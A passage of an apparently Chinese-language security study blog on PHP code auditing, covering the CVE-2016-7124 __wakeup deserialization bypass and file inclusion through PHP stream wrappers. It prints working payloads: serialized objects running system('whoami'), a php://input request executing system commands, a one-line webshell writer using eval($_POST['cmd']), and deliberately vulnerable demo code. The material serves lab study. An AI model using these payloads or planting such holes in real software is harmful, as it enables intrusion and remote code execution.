<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00*%00target&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>修改成员变量数目，绕过__wakeup()魔法函数，修改变量值长度与内容，添加恶意代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> O:1:&quot;A&quot;:1：&#123;s:9:&quot;%00*%00target&quot;;s:26:&quot;&lt;?php system(&#x27;whoami&#x27;); ?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025210652227.png" alt="image-20211025210652227"></p>
<h4 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h4><p>影响版本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP5 &lt; <span class="number">5.6</span>.<span class="number">25</span></span><br><span class="line">PHP7 &lt; <span class="number">7.0</span>.<span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>当序列化对象进行反序列化时，如果表示对象属性个数的值大于真实的属性个数时，就会跳过_wakeup()的执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$target</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;target = <span class="string">&quot;wakeup!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\phplearn\\webshell.php&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fputs(<span class="variable">$fp</span>,<span class="keyword">$this</span>-&gt;target);</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$test_unseria</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;webshell.php&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;.\webshell.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>查看此处代码可看出，当我们对类A进行反序列处理时，无论在$test处确立的target值为多少，unserialize()的前一刻都会触发A的__wakeup魔术方法，将序列化字符串中的target值处理为<code>wakeup</code>,最后调用析构函数____destruct()执行内部代码，将target值写入到文件之中，然后在php文件的结尾包含webshell.php之中进行执行。</p>
<p>此处存在一处漏洞点，定义的序列化字符串属性个数大于真实的字符串属性个数时，__wakeup()魔法函数将不会生效:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">源:O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;&#125;</span><br><span class="line">改:O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;s:<span class="number">18</span>:<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;&#125;</span><br><span class="line">在序列化字符串中，只修改成员变量的值无效，还需修改其长度为对应长度大小。</span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025204112483.png" alt="image-20211025204112483"></p>
<p>若类中成员变量为protected  、 private类型，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$target</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;target = <span class="string">&quot;wakeup!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\phplearn\\webshell.php&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        fputs(<span class="variable">$fp</span>,<span class="keyword">$this</span>-&gt;target);</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$test_unseria</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;webshell.php&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;.\webshell.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>php序列化字符串在相应成员函数处如下所示</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> 类型:在变量名前加上%<span class="number">00</span>*%<span class="number">00</span></span><br><span class="line">?file=O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00*%00target&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;&lt;?php system(&#x27;whoami&#x27;);?&gt;&quot;</span>;&#125;</span><br><span class="line"><span class="keyword">private</span>类型:%<span class="number">00</span>类名%<span class="number">00</span>变量名</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00A%00target&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;&lt;?php system(&#x27;whoami&#x27;);?&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025205746814.png" alt="image-20211025205746814"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-php代码审计学习-2" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/24/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2/" class="article-date">
      <time datetime="2021-10-24T11:25:29.000Z" itemprop="datePublished">2021-10-24</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/24/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2/">php代码审计学习(2)</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="PHP伪协议学习"><a href="#PHP伪协议学习" class="headerlink" title="PHP伪协议学习"></a>PHP伪协议学习</h3><p>参考自 <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结</a>、 <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">php伪协议实现命令执行的七种姿势</a>两篇文章进行复现学习。</p>
<h4 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a>file:// 协议</h4><ul>
<li><strong>条件</strong></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:off/on </span><br><span class="line">allow_url_include:off/on</span><br><span class="line"><span class="comment">#翻译一下就是file://协议的使用，不受这两个属性的开关的影响</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>作用</strong></li>
</ul>
<p>用于访问本地文件系统，在CTF中常用于<strong>读取本地文件</strong>且不受allow_url_fopen与allow_url_include的开关影响</p>
<p>include()、require()、require_once()、include_once() 参数可控的情况下，如导入非php文件，则仍会按照php的语法进行解析。</p>
<ul>
<li>include()、include_once()下：这是由于包含的文件放到了<?php ?>之内，代码执行到包含处依旧被会视为php文件内容，出错只会产生警报，而不会停止运行。</li>
<li>require()、require_once()下:是由于包含文件与原php文件拼接形成一个新的php文件，之后按照新php文件顺序进行执行。</li>
</ul>
<p><strong>说明：</strong></p>
<p>file:// 文件是PHP使用的默认封装协议，可用于读取本地文件。当指定一个相对路径作为读取目录，其相对时基于当前工作目录的。在很多情况下时脚本所在的目录，除非被修改过。当使用CLI时某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path </code>会可选地搜索，也作为相对的路径。</p>
<p><strong>用法：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/path/to/file.ext</span><br><span class="line">relative/path/to/file.ext</span><br><span class="line">fileInCwd.ext</span><br><span class="line">C:/path/to/winfile.ext</span><br><span class="line">C:\path\to\winfile.ext</span><br><span class="line">\\smbserver\share\path\to\winfile.ext</span><br><span class="line">file:<span class="comment">///path/to/file.ext</span></span><br></pre></td></tr></table></figure>

<p>举例展示：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=http://127.0.0.1/phplearn/phpinfo.txt</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=./phpinfo.txt</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=file://D:\phpstudy_pro\WWW\phplearn\phpinfo.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024195900350.png" alt="image-20211024195900350"></p>
<h4 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a>php:// 协议</h4><ul>
<li>条件：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen: off/on</span><br><span class="line">allow_url_include: 仅当php:<span class="comment">//input、php://memory、php://temp时需要on</span></span><br></pre></td></tr></table></figure>

<ul>
<li>作用：</li>
</ul>
<p><code>php:// </code>访问各个输入/输出流 。我们经常使用到的是<code>php://filter</code> 和<code>php://input</code> 用于<strong>读取源码</strong> ，php://input用于<strong>执行php代码</strong></p>
<ul>
<li>说明</li>
</ul>
<table>
<thead>
<tr>
<th>协议</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>php://input</td>
<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td>
</tr>
<tr>
<td>php://output</td>
<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
</tr>
<tr>
<td>php://fd</td>
<td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
</tr>
<tr>
<td>php://memory php://temp</td>
<td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
</tr>
<tr>
<td>php://filter</td>
<td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
</tr>
</tbody></table>
<ul>
<li><strong>php://filter</strong> 参数</li>
</ul>
<p>该协议的参数会在该协议上进行传递，多个参数都可以在一个路径下传递，具体参考如下：</p>
<table>
<thead>
<tr>
<th>php://filter 参数</th>
<th>描述</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>resource=&lt;要过滤的数据流&gt;</td>
<td>必须项。它指定了你要筛选过滤的数据流。</td>
<td></td>
</tr>
<tr>
<td>read=&lt;读链的过滤器&gt;</td>
<td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td>
<td>*）分隔。</td>
</tr>
<tr>
<td>write=&lt;写链的过滤器&gt;</td>
<td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td>
<td>）分隔。</td>
</tr>
<tr>
<td>&lt;; 两个链的过滤器&gt;</td>
<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>
<td></td>
</tr>
</tbody></table>
<p>其中 read 与 write 处于同级路径上。</p>
<ul>
<li>可选的过滤器列表(4类)</li>
</ul>
<table>
<thead>
<tr>
<th>字符串过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>string.rot13</td>
<td>等同于<code>str_rot13()</code>，rot13变换</td>
</tr>
<tr>
<td>string.toupper</td>
<td>等同于<code>strtoupper()</code>，转大写字母</td>
</tr>
<tr>
<td>string.tolower</td>
<td>等同于<code>strtolower()</code>，转小写字母</td>
</tr>
<tr>
<td>string.strip_tags</td>
<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>转换过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>convert.base64-encode &amp; convert.base64-decode</td>
<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
</tr>
<tr>
<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
</tr>
</tbody></table>
<p>其中最常用的便是convert.base64-encode 或 convert.base64-decode ，用于加解密完整读取文件</p>
<table>
<thead>
<tr>
<th>压缩过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>zlib.deflate &amp; zlib.inflate</td>
<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
</tr>
<tr>
<td>bzip2.compress &amp; bzip2.decompress</td>
<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>加密过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>mcrypt.*</td>
<td>libmcrypt 对称加密算法</td>
</tr>
<tr>
<td>mdecrypt.*</td>
<td>libmcrypt 对称解密算法</td>
</tr>
</tbody></table>
<ul>
<li>示例：</li>
</ul>
<ol>
<li> <code>php://fileter/read=convert.base64-encode/resource=[文件名] </code>以base64加密的方式读取文件</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024202338746.png" alt="image-20211024202338746"></p>
<p>​        2.<code>php://input</code> 执行php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行任意代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /phplearn/<span class="keyword">global</span>.php?file=php:<span class="comment">//input HTTP/1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">93.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">93.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 36</span></span><br><span class="line"><span class="comment">Origin: http://127.0.0.1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1/phplearn/global.php</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php eval(&#x27;system(&quot;ipconfig&quot;);&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024204509292.png" alt="image-20211024204509292"> </p>
<p>写webshell：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&quot;webshell.php&quot;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024205148007.png" alt="image-20211024205148007"></p>
<h4 id="zip-amp-bzip2-amp-zlib-协议"><a href="#zip-amp-bzip2-amp-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a>zip:// &amp; bzip2:// &amp; zlib:// 协议</h4><ul>
<li>条件:</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen: off/on;</span><br><span class="line">allow_url_include: off/on;</span><br></pre></td></tr></table></figure>

<ul>
<li>作用:<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属压缩流，可以访问压缩文件中的子文件，更重要的是，他并不需要指定后缀名，可修改为任意后缀：<code>jpg png gix</code>等等。</li>
<li>示例</li>
</ul>
<h5 id="zip-协议"><a href="#zip-协议" class="headerlink" title="zip://协议"></a>zip://协议</h5><p><code>zip://[压缩文件的绝对路径]%23[压缩文件内的子文件名]</code></p>
<p>压缩文件可以不为<strong>zip</strong>结尾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phplearn/global.php?file=zip://D:\phpstudy_pro\WWW\phplearn\hello.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024211907449.png" alt="image-20211024211907449"></p>
<h5 id="compress-zlib-file-gz"><a href="#compress-zlib-file-gz" class="headerlink" title="compress.zlib://file.gz"></a>compress.zlib://file.gz</h5><p>压缩phpinfo.txt为phpinfo.gz并上传(同样支持任意后缀名)</p>
<p>compress.zlib://D:\phpstudy_pro\WWW\phplearn\hello.txt.gz</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=compress.zlib://D:\phpstudy_pro\WWW\phplearn\hello.txt.gz</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025104109551.png" alt="image-20211025104109551"></p>
<h5 id="compress-bzip2-file-bzq2"><a href="#compress-bzip2-file-bzq2" class="headerlink" title="compress.bzip2://file.bzq2"></a>compress.bzip2://file.bzq2</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=compress.bzip2://D:\phpstudy_pro\WWW\phplearn\hello.txt.bz2</span></span><br></pre></td></tr></table></figure>

<p>此处我的电脑未能正常解析php文件。</p>
<h4 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h4><ul>
<li>条件</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:on;</span><br><span class="line">allow_url_include:one;</span><br></pre></td></tr></table></figure>

<ul>
<li>作用: 自<code>php&gt;=5.2.0</code>起，可以使用<code>data://</code> 数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码</li>
<li>语法:</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> php代码 <span class="meta">?&gt;</span></span></span><br><span class="line">data:<span class="comment">//text/plain;base64,<span class="meta">&lt;?php</span> php代码 <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>示例</li>
</ul>
<h5 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data://text/plain"></a>data://text/plain</h5><p>若是GET传参，在bp中应注意空格转换为%20避免解析错误</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span>%20phpinfo();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><strong><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025105240142.png" alt="image-20211025105240142"></strong></p>
<h5 id="data-text-plain-base64"><a href="#data-text-plain-base64" class="headerlink" title="data://text/plain;base64,"></a>data://text/plain;base64,</h5><p>将php代码转为base64形式，特殊字符转为url格式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025105549575.png" alt="image-20211025105549575"></p>
<h4 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp;https:// 协议"></a>http:// &amp;https:// 协议</h4><ul>
<li>条件</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:on</span><br><span class="line">allow_url_fopen:on</span><br></pre></td></tr></table></figure>

<ul>
<li>作用: 常规url格式，允许<code>http 1.0</code>的GET方法，以只读访问文件或资源换。CTF常用于远程文件包含</li>
<li>用法</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure>

<ul>
<li>示例</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.31.22.30/phplearn/global.php?file=http://127.0.0.1/phplearn/phpinfo.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025105851296.png" alt="image-20211025105851296"></p>
<h4 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a>phar:// 协议</h4><p>phar:// 协议与zip协议类似，同样可以访问zip格式的压缩包内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar:<span class="comment">//D:\phpstudy_pro\WWW\phplearn\phpinfo.zip\phpinfo.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025110236065.png" alt="image-20211025110236065"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-PHP代码审计学习-1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
